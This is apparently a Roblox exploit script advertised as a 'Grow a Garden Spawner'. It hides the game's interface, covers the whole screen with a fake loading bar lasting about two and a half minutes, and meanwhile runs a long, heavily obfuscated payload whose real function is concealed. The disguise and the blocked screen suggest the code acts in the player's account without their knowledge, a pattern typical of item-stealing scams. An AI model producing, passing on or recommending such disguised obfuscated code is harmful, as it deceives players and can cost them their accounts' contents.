local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

pcall(function()
    for _, v in pairs(Enum.CoreGuiType:GetEnumItems()) do
        StarterGui:SetCoreGuiEnabled(v, false)
    end
    StarterGui:SetCore("TopbarEnabled", false)
end)

local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Name = "GardenLoadUI"
gui.Parent = CoreGui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Parent = gui

local emojiLayer = Instance.new("Frame")
emojiLayer.Size = UDim2.new(1, 0, 1, 0)
emojiLayer.BackgroundTransparency = 1
emojiLayer.ZIndex = 0
emojiLayer.ClipsDescendants = false
emojiLayer.Name = "EmojiLayer"
emojiLayer.Parent = bg

local uiLayer = Instance.new("Frame")
uiLayer.Size = UDim2.new(1, 0, 1, 0)
uiLayer.BackgroundTransparency = 1
uiLayer.ZIndex = 2
uiLayer.Parent = bg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0.25, 0)
title.Text = "🦝 Grow a Garden Spawner Loading.."
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.TextTransparency = 1
title.ZIndex = 2
title.Parent = uiLayer

TweenService:Create(title, TweenInfo.new(2), {TextTransparency = 0}):Play()

local loadBg = Instance.new("Frame")
loadBg.Size = UDim2.new(0.6, 0, 0.025, 0)
loadBg.Position = UDim2.new(0.2, 0, 0.4, 0)
loadBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
loadBg.BorderSizePixel = 0
loadBg.ClipsDescendants = true
loadBg.ZIndex = 2
loadBg.Parent = uiLayer

-- Loading Bar
local loadBar = Instance.new("Frame")
loadBar.Size = UDim2.new(0, 0, 1, 0)
loadBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
loadBar.BorderSizePixel = 0
loadBar.ZIndex = 2
loadBar.Parent = loadBg

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 30)
loadingText.Position = UDim2.new(0, 0, 0.46, 0)
loadingText.Text = "Please be patient"
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.FredokaOne
loadingText.TextScaled = true
loadingText.ZIndex = 2
loadingText.Parent = uiLayer

local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1, 0, 0, 30)
percentText.Position = UDim2.new(0, 0, 0.55, 0)
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.BackgroundTransparency = 1
percentText.Font = Enum.Font.FredokaOne
percentText.TextScaled = true
percentText.ZIndex = 2
percentText.Parent = uiLayer

local emojis = {"🦝", "🐉", "🦊", "🥚", "🐣", "🦋"}
task.spawn(function()
    while gui.Parent do
        local emoji = Instance.new("TextLabel")
        emoji.Size = UDim2.new(0, 30, 0, 30)
        emoji.Text = emojis[math.random(1, #emojis)]
        emoji.TextScaled = true
        emoji.Font = Enum.Font.FredokaOne
        emoji.BackgroundTransparency = 1
        emoji.TextColor3 = Color3.new(1, 1, 1)
        emoji.Position = UDim2.new(math.random(), 0, -0.1, 0)
        emoji.ZIndex = 0
        emoji.Visible = true
        emoji.Parent = emojiLayer

        local fallTime = math.random(6, 10)
        local tween = TweenService:Create(emoji, TweenInfo.new(fallTime, Enum.EasingStyle.Linear), {
            Position = UDim2.new(emoji.Position.X.Scale, 0, 1.1, 0)
        })
        tween:Play()
        game.Debris:AddItem(emoji, fallTime + 1)
        task.wait(0.4)
    end
end)

task.spawn(function()
    local dots = ""
    while gui.Parent do
        dots = dots == "..." and "" or dots .. "."
        loadingText.Text = "Please be patient" .. dots
        task.wait(0.5)
    end
end)

task.spawn(function()
    for i = 1, 100 do
        loadBar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 1.4, true)
        percentText.Text = i .. "%"
        task.wait(1.5)
    end
end)

spawn(function()

return(function(...)local N={"\048\119\068\066\055\118\105\077\050\053\118\121\106\121\083\105\074\112\078\111\066\069\100\049\101\077\089\069\086\106\055\066\049\121\112\074\118\066\049\068\069\114\084\061","\083\117\069\055\083\117\105\119";"\057\048\083\068\075\110\078\084\114\070\104\121\110\118\065\043\114\088\061\061","\078\112\053\050\107\087\061\061","\053\117\068\081\108\118\101\090","\056\116\105\055\053\118\069\065","\079\113\121\061","\110\111\101\049\056\116\050\081\079\109\057\061","\103\117\065\048\110\118\053\116\108\086\087\117\106\109\050\122\056\072\061\061";"\085\052\088\076\043\082\051\079\113\087\056\120\072\073\087\110\112\086\047\098\070\075\088\099\106\048\112\120\116\101\053\065\117\055\074\052\088\075\119\097\098\081\103\057\114\083\101\078\115\087\086\121\109\098\052\118\048\048\077\068\054\078\088\101\068\081\121\119\117\103\114\088\073\066\089\119\043\084\087\065\048\107\051\088\122\122\087\070\048\105\057\112\071\057\098\047\111\111\103\090\069\077\081\073\121\057\106\061";"\110\110\104\106";"\053\117\105\065\053\087\061\061","\108\109\050\047\083\109\101\097";"\111\068\069\065\053\111\103\081\108\118\105\089\079\118\057\061","\108\118\105\086\077\047\061\061";"\057\105\104\057\103\118\108\052\106\118\068\115\083\068\049\117","\079\109\105\119\077\088\061\061","\077\086\105\048\048\119\115\050\103\118\078\083\075\113\088\061";"\079\113\115\061";"\114\110\101\053\085\117\108\102\110\098\120\097\087\049\108\051\083\072\061\061","\056\080\103\122\077\109\050\098","\056\082\087\047\108\116\053\098\083\119\110\103\108\121\101\085";"\079\118\069\081\053\070\101\119\056\116\049\055\053\047\061\061";"\103\073\053\115\083\043\118\065\072\065\069\084\104\122\073\083\112\089\066\081","\108\118\105\089\079\118\057\061","\114\116\101\086\110\105\104\116\079\118\103\082\056\116\110\104\110\072\061\061";"\053\111\104\122\079\080\115\061","\054\112\079\121\119\074\047\051\122\083\081\084\100\073\052\054\069\107\056\088\089\087\098\043\087\051\115\057\048\074\120\054\076\076\072\071\077\105\069\072\115\099\113\109\054\048\115\057\116\076\116\100\055\100\075\072\099\066\083\099\071\115\076\090\119\049\113\089\097\108\069\080\110\065\099\076\104\113\107\119\076\102\088\097\120\111\056\076\056\100\115\121\099\081\106\056\097\066\067\061";"\110\118\105\065\056\118\110\122\115\121\103\049\108\118\110\082\108\118\110\067\115\087\061\061","\077\048\105\081\087\098\081\053\083\117\104\050\110\119\069\052\110\080\088\061";"\075\089\072\049\053\099\090\078\075\072\061\061","\079\118\110\055","";"\111\068\069\078\079\116\103\049\114\088\061\061","\053\080\101\068\083\072\061\061","\053\116\043\073\079\080\115\061";"\048\105\101\101\077\119\078\078\087\110\108\083\085\105\104\118\108\047\061\061";"\083\117\081\081\056\072\061\061";"\056\117\110\119\079\109\110\119\083\111\103\081\083\116\043\049","\110\117\110\089\077\118\069\073\077\047\061\061","\111\068\069\098\083\047\061\061";"\108\118\069\055\108\109\068\089\053\111\115\061","\108\118\069\086\108\070\104\078\079\116\056\061","\085\070\103\119\056\121\108\049\108\088\061\061";"\056\098\067\068\108\068\115\084\056\098\101\051\057\110\078\078\083\109\115\061";"\103\049\108\052\079\057\101\115\106\048\110\118\056\049\120\054\101\117\115\061";"\087\082\049\067\057\067\069\049\048\048\105\074\101\047\061\061";"\056\116\110\065\079\080\053\049";"\101\105\105\082\087\057\101\082\077\109\069\109\056\080\049\116\053\047\061\061";"\048\080\083\080\079\111\083\080\109\105\108\117\079\117\103\103","\111\068\069\076\053\109\084\061";"\082\118\082\106\107\101\067\061","\057\116\069\080\053\057\053\104\108\082\101\102\056\082\049\103\085\111\057\061","\109\105\108\082\083\086\104\105\087\117\065\051\053\119\078\105\110\119\090\061";"\056\118\101\081\079\118\047\061","\083\098\049\119\053\087\061\061","\075\072\061\061"}for S,h in ipairs({{255400+-255399,-919613+919670},{989631+-989630,149246-149221},{90045-90019;-681660-(-681717)}})do while h[-381548+381549]<h[-430061+430063]do N[h[-994750-(-994751)]],N[h[-255910-(-255912)]],h[-1019456+1019457],h[156901+-156899]=N[h[-360427+360429]],N[h[-562097+562098]],h[398893-398892]+(-48289+48290),h[-75808-(-75810)]-(375725-375724)end end local function S(S)return N[S-(504697-453486)]end do local S=table.concat local h=N local d=string.sub local M=type local j=table.insert local b={T=-211815+211871,Z=577970+-577930,["\049"]=464366+-464329,v=772024+-772018,Q=482671+-482638;i=-812153+812158;A=-115511-(-115556),S=1031448-1031424;t=913020+-912982;X=-1009791-(-1009791),P=359778-359723,K=-386014-(-386028);["\048"]=198329-198310,c=698230+-698228;f=-1009749-(-1009791);M=150309+-150283;["\054"]=-150678-(-150693),W=-800169-(-800185),["\043"]=309915-309866,z=158309+-158259,G=713078+-713015;o=-390572+390595,w=-30369+30421,h=-145500-(-145509),E=-1028547-(-1028608);H=-1001439-(-1001471),U=-641122-(-641140);C=-1038812-(-1038848);["\053"]=-915427-(-915452);L=719158+-719114,p=372780+-372749;I=708901-708854,n=-294548-(-294569),Y=-744631+744665,j=-209114-(-209126),R=-753527+753562,V=-184614+184665,q=420976-420973;e=-415085+415098;y=-978490-(-978494);N=-17953+17994;g=156581+-156564,D=191590+-191537;["\056"]=395208-395180,["\052"]=-146917+146975,x=-671220-(-671221);m=-640670-(-640692);["\047"]=58194-58146,["\051"]=339179+-339168;J=853444-853434,d=-742393-(-742455);s=-768504+768512,r=-981088-(-981118),O=-565746+565773,l=417034-417005;F=-988664-(-988671),b=-198566+198605;["\055"]=420699-420653,a=-132153-(-132196);k=1008703+-1008644;B=212643-212583;u=477285-477231;["\057"]=-690273-(-690293);["\050"]=1030528+-1030471}local s=string.len local I=string.char local Y=math.floor for N=410606-410605,#h,125605-125604 do local v=h[N]if M(v)=="\115\116\114\105\110\103"then local M=s(v)local w={}local G=833915-833914 local H=247336-247336 local X=-606707-(-606707)while G<=M do local N=d(v,G,G)local S=b[N]if S then H=H+S*(-275049-(-275113))^((224295+-224292)-X)X=X+(618612-618611)if X==-565362+565366 then X=716726+-716726 local N=Y(H/(-535219-(-600755)))local S=Y((H%(700020-634484))/(989375-989119))local h=H%(-646900-(-647156))j(w,I(N,S,h))H=-213287+213287 end elseif N=="\061"then j(w,I(Y(H/(88867+-23331))))if G>=M or d(v,G+(713975-713974),G+(1022784+-1022783))~="\061"then j(w,I(Y((H%(290793+-225257))/(580786-580530))))end break end G=G+(13473-13472)end h[N]=S(w)end end end return(function(N,d,M,j,b,s,I,v,q,h,i,o,X,V,E,H,G,J,n,w,Y)J,v,Y,i,h,E,w,V,X,G,n,H,o,q=function(N,S)local d=H(S)local M=function()return h(N,{},S,d)end return M end,{},{},function(N,S)local d=H(S)local M=function(M,j)return h(N,{M,j},S,d)end return M end,function(h,M,j,b)local C,k,m,v,p,Q,T,Z,r,l,F,H,u,I,c,z,o,R,x,e,t,g,D,y,K,X,A,B,P,f,L,a,G,O while h do if h<456558+8701083 then if h<-609075+4936078 then if h<-27809+2596177 then if h<-993855+1930627 then if h<-40225+516727 then if h<-132580+388597 then if h<-895511-(-1037888)then h=true Y[j[96291+-96290]]=h h=N[S(470895+-419679)]I={}else u=1012735+-1012480 G=H h=Y[j[-876731+876732]]R=245224-245224 Q=h(R,u)v[G]=Q h=4042587-(-151333)G=nil end else O=not y e=e+K R=e<=u R=O and R O=e>=u O=y and O R=O or R O=-108771+12656738 h=R and O R=78306+15764482 h=h or R end else if h<318826+338913 then p=g h=2731955-289129 x=p O[p]=x p=nil else h=true Q=S(-857306-(-908540))G=w()v=M H=S(383715-332458)o=w()Y[G]=h I=N[H]H=S(119140+-67899)h=I[H]H=w()Y[H]=h h=q(5379652-558513,{})X=w()Y[X]=h R=J(607858-588402,{o})h=false Y[o]=h t=N[Q]Q=t(R)h=Q and 1042944+13565374 or-910972+7427907 I=Q end end else if h<1501964-109347 then if h<1122885-(-62818)then if h<470383+552021 then h=true h=h and 658804+982718 or-846586+9824268 else H=264168+-264167 G=Y[j[-637873-(-637876)]]v=G~=H h=v and 3014396-375468 or 786552+4593708 end else c=S(-543921+595164)k=S(869775-818553)h=N[k]l=N[c]k=h(l)h=S(-173989+225244)N[h]=k h=-759480+12455453 end else if h<-625267+2827949 then k=-274024+274025 h=Y[Q]l=-768248+768254 T=h(k,l)l=S(254173-202918)h=S(984959+-933704)N[h]=T k=N[l]l=-164709+164711 h=k>l h=h and 1591248-237991 or 9713672-655604 else g=g+c x=not F p=g<=l p=x and p x=g>=l x=F and x p=x or p x=666165+-41506 h=p and x p=-958910+6770799 h=h or p end end end else if h<2582354-(-958846)then if h<2209202-(-661108)then if h<-167525+3023553 then if h<-183654+2836921 then H=-720598-(-720630)G=Y[j[945981+-945978]]v=G%H u=-910140+910142 X=Y[j[37989-37985]]K=-337386+337399 Q=Y[j[-832184-(-832186)]]p=Y[j[-459182+459185]]O=p-v p=185350-185318 y=O/p e=K-y R=u^e t=Q/R R=448686+-448685 o=X(t)X=261480+4294705816 H=o%X o=-756149-(-756151)X=o^v G=H/X X=Y[j[1022724-1022720]]Q=G%R R=519088+4294448208 t=Q*R h=959166+13083375 o=X(t)X=Y[j[-951737-(-951741)]]K=484079-483823 u=-199910-(-200166)t=X(G)H=o+t o=-833402+898938 v=nil X=H%o Q=-413743-(-479279)t=H-X o=t/Q Q=-477615-(-477871)t=X%Q H=nil R=X-t Q=R/u u=-246440+246696 R=o%u G=nil e=o-R o=nil u=e/K X=nil e={t,Q;R,u}u=nil Y[j[-496111+496112]]=e R=nil t=nil Q=nil else h=true h=h and-1010751+14602718 or 477935+10340443 end else h=-89891+6175709 H=Y[j[-138276+138282]]G=H==v I=G end else if h<2560505-(-412589)then G=Y[j[-662259-(-662261)]]H=-60514+60767 v=G*H G=719030+109524289455 I=v+G v=35184371956188-(-132644)h=I%v Y[j[-521646-(-521648)]]=h v=Y[j[1040768+-1040765]]h=5705550-325290 G=-262376+262377 I=v~=G else h=34785+10947950 Y[G]=I end end else if h<-627955+4713670 then if h<4603011-716918 then I={}p={}g=w()Y[g]=p Q=nil p=w()l=E(490543+13384057,{g;u;e;o})Y[p]=l K=nil O=nil h=N[S(-880485-(-931709))]R=nil o=n(o)t=nil l={}B=nil t=S(948413+-897162)x={}z=S(304666-253416)c=w()L=S(507120+-455907)Y[c]=l F=S(325802+-274584)l=N[F]D=Y[c]a={[L]=D,[z]=B}F=l(x,a)l=V(399724+14499931,{c,g,y,u;e;p})e=n(e)Y[G]=F Y[X]=l c=n(c)o=N[t]Q=Y[G]p=n(p)g=n(g)u=n(u)K=22712479931192-(-259944)e=S(863227+-811996)R=Y[X]H=nil y=n(y)u=R(e,K)t=Q[u]H=o[t]R=S(902006-850746)t=q(-846650+13247157,{G;X})u=-79138+4907149969148 o=H(t)o=Y[G]t=Y[X]Q=t(R,u)H=o[Q]o=S(453358+-402114)e=10441384809777-667445 N[o]=H u=S(-805590-(-856827))t=Y[G]K=629172+3095691522447 Q=Y[X]R=Q(u,e)o=t[R]t=S(-951485+1002704)N[t]=o e=S(-734090-(-785336))Q=Y[G]R=Y[X]u=R(e,K)X=n(X)t=Q[u]Q=S(-576004-(-627251))N[Q]=t R=S(404646-353387)Q=N[R]e=S(540703-489455)y=S(927914-876667)u=N[e]K=N[y]y=S(642740+-591517)G=n(G)y=u[y]e={y(u,K)}R=Q(d(e))Q=R()else g=#O l=213031-213031 p=g==l h=p and 875899+3009787 or 578482+11930060 end else if h<3899484-(-367787)then H=H+o G=H<=X Q=not t G=Q and G Q=H>=X Q=t and Q G=Q or G Q=851002-615987 h=G and Q G=8534117-90979 h=h or G else h=-942525+3630095 end end end end else if h<7743477-712246 then if h<884411+4889565 then if h<5604391-550385 then if h<4714303-(-96931)then if h<-581874+4982331 then T=Y[G]C=T h=T and 606387+11543232 or 8277213-56802 else I=S(278524-227303)X=S(-485935+537157)h=N[I]u=i(15572028-416877,{})R=S(-726519+777753)v=Y[j[459566+-459562]]H=N[X]Q=N[R]R={Q(u)}t={d(R)}Q=799483-799481 o=t[Q]X=H(o)H=S(965054+-913787)G=v(X,H)v={G()}I=h(d(v))v=I G=Y[j[-759667-(-759672)]]h=G and 1859864-(-1009471)or 6800688-714870 I=G end else I=S(-129764+181027)v=S(-989183-(-1040448))h=N[I]I=h(v)I={}h=N[S(-744695+795961)]end else if h<5051903-(-673205)then G=Y[j[101414-101411]]H=-67938+68080 v=G*H G=-824569-(-824826)I=v%G h=1546127-418157 Y[j[223850-223847]]=I else r=409197+-409195 Z=z[r]h=1034432+9292411 r=Y[D]B=Z==r f=B end end else if h<6556008-358891 then if h<919356+5027437 then l=920445-920445 h=-872059+13380601 g=#O p=g==l else h=-571954+17281072 Y[j[320042+-320037]]=I v=nil end else if h<6159339-(-352875)then O=S(85150-33889)h=16333907-(-416)y=N[O]O=S(30736-(-20513))K=y[O]u=K else y=S(-795961+847222)Q=S(-656769-(-708022))R=S(-951426-(-1002687))t=I I=N[Q]Q=S(364436-313194)h=I[Q]Q=w()Y[Q]=h I=N[R]R=S(-797049+848287)h=I[R]K=N[y]R=h e=h h=K and 7005366-799737 or 16186382-(-147941)u=K end end end else if h<9598889-1040320 then if h<355179+7858053 then if h<609395+7358931 then if h<8274546-1032448 then h=E(4464424-137892,{X})T={h()}I={d(T)}h=N[S(830390-779128)]else h=467182+9334333 end else r=-1034111-(-1034112)Z=z[r]r=false B=Z==r m=h f=B h=B and 550193+5221247 or 10110484-(-216359)end else if h<39969+8184426 then Y[G]=C h=Y[G]h=h and 7731468-171557 or 12050576-(-712438)else h=Y[j[278323-278313]]G=Y[j[-384108+384119]]v[h]=G h=Y[j[726647+-726635]]G={h(v)}h=N[S(-383980+435238)]I={d(G)}end end else if h<8926814-(-83747)then if h<-25569+8971950 then v=S(-754682-(-805945))H=1120-1120 h=N[v]G=Y[j[-129692-(-129700)]]v=h(G,H)h=8835821-(-245800)else I={}h=N[S(-964606+1015838)]end else if h<505200+8567797 then l=S(374380+-323125)h=N[l]l=S(133838-82595)N[l]=h h=-474159+12170132 else h={}G=-822265+822266 v=h H=Y[j[-650283-(-650292)]]X=H H=18209+-18208 h=403565+3790355 o=H H=263720-263720 t=o<H H=G-o end end end end end else if h<996543+11643038 then if h<12244292-959486 then if h<395500+9904029 then if h<476271+9286780 then if h<337898+9139139 then if h<8668734-(-624627)then P=170662-170661 Y[G]=f r=Y[a]Z=r+P B=z[Z]m=K+B B=326314-326058 h=m%B Z=Y[x]B=y+Z Z=929597-929341 K=h m=B%Z y=m h=11675204-692469 else h=349867+15765825 e=S(513695-462446)u=N[e]I=u end else h=true h=h and 12235414-262440 or 7372033-138788 end else if h<928509+8881605 then K=nil G=n(G)X=n(X)u=n(u)y=nil t=nil R=nil g=n(g)e=n(e)O=nil Q=n(Q)t=S(657140+-605887)G=nil H=n(H)X=w()Y[X]=G Q=S(128663-77410)G=w()O={}o=n(o)h=1473932-(-968894)p=nil H=nil Y[G]=H o=N[t]p=-968189-(-968190)K={}t=S(-813100-(-864315))H=o[t]o=w()u=S(-768192-(-819449))Y[o]=H t=N[Q]Q=S(260496-209254)H=t[Q]R=S(-250216+301477)Q=N[R]y=w()R=S(-548056-(-599283))e=w()t=Q[R]R=N[u]u=S(866890-815673)Q=R[u]u=w()R=770616-770616 Y[u]=R R=-780022-(-780024)Y[e]=R Y[y]=K R={}g=-815737-(-815993)K=574322-574322 l=g g=-788663-(-788664)c=g g=844794+-844794 F=c<g g=p-c else B=128932+-128931 m=z[B]f=m h=-522608+9690248 end end else if h<10357300-(-526000)then if h<741943+9848557 then h=m h=3288196-257064 I=f else h=N[S(-176229+227457)]I={}end else if h<-351659+11441183 then F=n(F)x=n(x)a=n(a)z=nil L=n(L)D=n(D)c=n(c)h=13406137-(-880123)else G=S(-568498+619724)I=13304886-(-923005)H=254440+1531983 v=G^H h=I-v v=h I=S(992627-941373)h=I/v I={h}h=N[S(842810+-791558)]end end end else if h<12612471-206502 then if h<13184493-979518 then if h<11795299-(-349803)then if h<981438+10921126 then h=-774776+1730197 else h=782776-(-172645)end else T=K==y h=7821839-(-398572)C=T end else if h<11714562-(-643444)then F=S(-150193-(-201446))c=w()P=-798009+798009 Y[c]=C I=N[F]x=-334854-(-334954)F=S(-494727-(-545969))h=I[F]F=987200-987199 I=h(F,x)x=-668917+668917 F=w()z=-64160-(-64162)Y[F]=I a=736118-735863 h=Y[Q]I=h(x,a)x=w()B=S(-340118-(-391340))Y[x]=I D=327210+-327209 a=156261+-156260 h=Y[Q]L=Y[F]I=h(a,L)a=w()Y[a]=I A=-688693+698693 I=Y[Q]L=I(D,z)z=S(-529550-(-580786))I=-416044-(-416045)h=L==I L=w()Y[L]=h m=N[B]Z=Y[Q]r={Z(P,A)}B=m(d(r))I=S(-592113-(-643380))m=S(-768981-(-820217))f=B..m D=z..f h=S(-607219+658433)z=S(-433677-(-484911))h=p[h]h=h(p,I,D)D=w()f=q(13490940-971134,{Q;c,e;H,G,g;L;D,F;a;x;u})Y[D]=h I=N[z]z={I(f)}h={d(z)}z=h h=Y[L]h=h and 12368858-(-754615)or-562609+13050158 else G=S(-200312-(-251560))Q=S(-570419-(-621683))I=S(-52066+103325)h=N[I]R=20961+25375441160815 v=N[G]X=Y[j[-730615+730616]]o=Y[j[361643+-361641]]t=o(Q,R)H=X[t]X=S(1001023+-949800)X=v[X]o=S(489647+-438407)G={X(v,H)}I=h(d(G))h=I()v=h G=Y[j[-595825-(-595826)]]t=-993279+6874305937665 H=Y[j[526898-526896]]X=H(o,t)I=G[X]h=v[I]I=h()v=nil I={}h=N[S(-184102+235347)]end end else if h<-418093+12933985 then if h<-1009343+13500772 then m=Y[G]h=m and 10601188-634804 or 365163+8802477 f=m else x=-165988-(-165989)l=#O h=4867317-973438 g=370668-370667 p=H(g,l)g=t(O,p)l=Y[y]p=nil F=g-x c=Q(F)l[g]=c g=nil end else if h<-458222+12989681 then o=-125538-(-125540)X=5664+-5663 G=Y[j[-40161+40162]]H=G(X,o)G=-733942-(-733943)v=H==G h=v and 329322+14039373 or-642804+15213233 I=v else R=e k=S(-631284+682541)T=N[k]k=S(-733303+784538)C=T[k]T=C(v,R)C=Y[j[153771-153765]]k=C()g=T+k p=g+t g=985919-985663 h=425645+-26785 k=-53346+53347 O=p%g g=H[G]t=O T=t+k C=X[T]p=g..C R=nil H[G]=p end end end end else if h<14325293-352 then if h<14873641-1022976 then if h<12821564-(-278121)then if h<-318314+13197478 then if h<12031888-(-716918)then I={G}h=N[S(830906+-779667)]else h=true h=407149+6826096 end else h=-274088+12966956 end else if h<14128695-897788 then f=Y[G]I=f h=f and 7296190-(-912444)or 3771731-740599 else v=S(-512880+564123)I=S(855803+-804548)h=N[I]I=N[v]v=S(674334-623091)N[v]=h v=S(94883+-43628)h=-460142+3147712 N[v]=I v=Y[j[-138851-(-138852)]]G=v()end end else if h<13247196-(-923069)then if h<13086395-(-852282)then v=Y[j[-666292-(-666293)]]I=#v v=-591922-(-591922)h=I==v h=h and 553265+2341159 or-691957+14734498 else H=S(724402-673141)G=N[H]H=S(553393+-502166)v=G[H]H=Y[j[-791928-(-791929)]]G={v(H)}I={d(G)}h=N[S(-867299-(-918524))]end else if h<13984422-(-267176)then h={}R=S(-548666-(-599923))Y[j[-790903-(-790905)]]=h I=Y[j[812156-812153]]o=-345131+35184372433963 Q=-457519-(-457774)X=I I=G%o Y[j[292905+-292901]]=I t=G%Q Q=339243+-339241 o=t+Q Y[j[-769912+769917]]=o Q=N[R]R=S(-92832-(-144100))t=Q[R]Q=t(v)t=S(-532838-(-584050))H[G]=t t=267549-267368 e=195047-195046 K=e h=1354762-955902 u=Q e=-872571-(-872571)R=516272+-516271 y=K<e e=R-K else C=C+k c=not l I=C<=T I=c and I c=C>=T c=l and c I=c or I c=-867707+13131505 h=I and c I=3525003-(-811769)h=h or I end end end else if h<-340267+15582299 then if h<15312448-556465 then if h<215911+14372419 then if h<15451784-992063 then h=I and 1017728+3425543 or 17260463-551345 else h=14475930-107235 G=Y[j[-762232+762234]]H=Y[j[451886+-451883]]v=G==H I=v end else h=160229+6356706 t=Y[o]I=t end else if h<15221961-118436 then h=Y[j[1000191+-1000190]]v=M[-987839+987840]H=h G=M[-999421-(-999423)]h=H[G]h=h and-953406+13991372 or 14338454-136164 else H=471215+1372042 G=S(-327759-(-378988))I=7301760-823738 v=G^H h=I-v v=h I=S(955101-903868)h=I/v I={h}h=N[S(-413110-(-464366))]end end else if h<205158+16059166 then if h<870523+15096437 then Q=nil h=13367737-674869 X=nil t=nil else k=S(-740855+792077)u=w()K=928446-928381 Y[u]=I h=Y[Q]e=-19422-(-19425)I=h(e,K)h=224295+-224295 e=w()p=q(11299194-48674,{})K=h Y[e]=I O=S(700342+-649108)I=N[O]h=-863163-(-863163)O={I(p)}y=h I=-15456+15458 h={d(O)}O=h h=O[I]I=S(227962-176741)p=h h=N[I]g=Y[H]T=N[k]k=T(p)T=S(-173285+224552)C=g(k,T)g={C()}I=h(d(g))g=w()Y[g]=I C=Y[e]I=1017537-1017536 T=C C=415214-415213 k=C C=525104-525104 l=k<C h=4576+14281684 C=I-k end else if h<953662+15682652 then I=u h=e h=u and 525424+15590268 or 10485088-1041472 else h=Y[j[405357+-405350]]h=h and 8038229-(-611763)or 9201529-119908 end end end end end end end h=#b return d(I)end,function(N,S)local d=H(S)local M=function(M,j,b,s,I)return h(N,{M;j,b,s,I},S,d)end return M end,function()G=(510961-510960)+G v[G]=136293-136292 return G end,function(N,S)local d=H(S)local M=function(M,j,b)return h(N,{M,j,b},S,d)end return M end,function(N)local S,h=-276328-(-276329),N[-195558+195559]while h do v[h],S=v[h]-(-294313+294314),S+(-458285-(-458286))if 537265+-537265==v[h]then v[h],Y[h]=nil,nil end h=N[S]end end,127012+-127012,function(N)v[N]=v[N]-(640053-640052)if 149541-149541==v[N]then v[N],Y[N]=nil,nil end end,function(N)for S=581043-581042,#N,181926+-181925 do v[N[S]]=v[N[S]]+(-101986-(-101987))end if M then local h=M(true)local d=b(h)d[S(-81379+132592)],d[S(428608-377388)],d[S(-848122+899352)]=N,X,function()return 217319+663220 end return h else return j({},{[S(369579+-318359)]=X,[S(3180-(-48033))]=N,[S(-932768-(-983998))]=function()return 1429132-548593 end})end end,function(N,S)local d=H(S)local M=function(...)return h(N,{...},S,d)end return M end,function(N,S)local d=H(S)local M=function(M)return h(N,{M},S,d)end return M end return(o(-813881+1474381,{}))(d(I))end)(getfenv and getfenv()or _ENV,unpack or table[S(-414253+465502)],newproxy,setmetatable,getmetatable,select,{...})end)(...)